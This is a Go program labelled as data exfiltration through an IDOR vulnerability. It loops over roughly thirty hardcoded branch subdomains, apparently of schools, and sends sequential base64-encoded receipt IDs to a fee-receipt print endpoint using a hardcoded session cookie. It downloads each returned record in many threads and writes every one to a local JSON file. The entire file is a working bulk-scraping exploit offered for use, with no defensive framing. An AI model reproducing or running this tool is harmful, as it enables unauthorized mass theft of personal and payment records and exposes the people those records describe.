package main

/*
Copyright Â© 2022 Himadri Bhattacharjee

Data exfiltration through IDOR vulnerability
*/

import (
	"encoding/base64"
	"encoding/json"
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"path"
)

const max int = 1 << 28

var endpoint string
var n int

type work struct {
	branch string
	id     int
}

func do(jobs <-chan work, result chan<- error) {
	var dynObj map[string]interface{}
	for job := range jobs {
		filepath := path.Join(job.branch, fmt.Sprintf("%d.json", job.id))
		if _, err := os.Stat(filepath); err == nil {
			result <- fmt.Errorf("file `%s` already exists", filepath)
			continue
		}
		ro, err := http.NewRequest("GET", fmt.Sprintf("https://%s.%s/gw/fee/getReceiptPrintData?fl=%s", job.branch, endpoint, base64.StdEncoding.EncodeToString([]byte(fmt.Sprintf("id=%d", job.id)))), nil)
		if err != nil {
			result <- err
			continue
		}
		ro.AddCookie(&http.Cookie{Name: "JSESSIONID", Value: "bMDrRYwaIE8fntbN1yTZNw"})
		r, err := new(http.Client).Do(ro)
		if err != nil {
			result <- err
			continue
		}
		defer r.Body.Close()
		b, err := ioutil.ReadAll(r.Body)
		if err != nil {
			result <- err
			continue
		}
		if err := json.Unmarshal(b, &dynObj); err != nil {
			result <- err
			continue
		}
		if dynObj["d"] == nil {
			result <- fmt.Errorf("%s, %d: JSONObject `d` is nil", job.branch, job.id)
			continue
		}
		dump, err := json.Marshal(dynObj["d"])
		if err != nil {
			result <- err
			continue
		}
		if err := ioutil.WriteFile(filepath, dump, 0644); err != nil {
			result <- err
			continue
		}
		result <- nil
	}
}

func main() {
	branches := []string{"alcs", "asc", "ccs", "ccspp", "dpset", "dpsnt", "dpsrh", "dpsrhj", "gdgps", "gkk", "gmps", "idps", "iphs", "kpps", "mrvjp", "mrvms", "mrvps", "rkvvm", "sajp", "sapp", "sbdn", "sbfz", "sbg", "sbgh", "sps", "spsjh", "spsjr", "spskg", "spskt", "vsis"}
	flag.StringVar(&endpoint, "u", "127.0.0.1", "Endpoint URI to exploit")
	flag.IntVar(&n, "t", 16, "Number of threads to use per branch")
	flag.Parse()
	if n < 1 {
		log.Fatalln("At least 1 worker thread is needed")
		return
	}
	result, jobs := make(chan error), make(chan work, n)
	for _, B := range branches {
		os.Mkdir(B, 0755)
		go func() {
			for i := 0; i < max; i++ {
				jobs <- work{B, i}
			}
		}()
	}
	for i := 0; i < n; i++ {
		go do(jobs, result)
	}
	for i := 0; i < max*len(branches); i++ {
		if err := <-result; err != nil {
			log.Println(err)
		}
	}
	close(jobs)
	close(result)
}
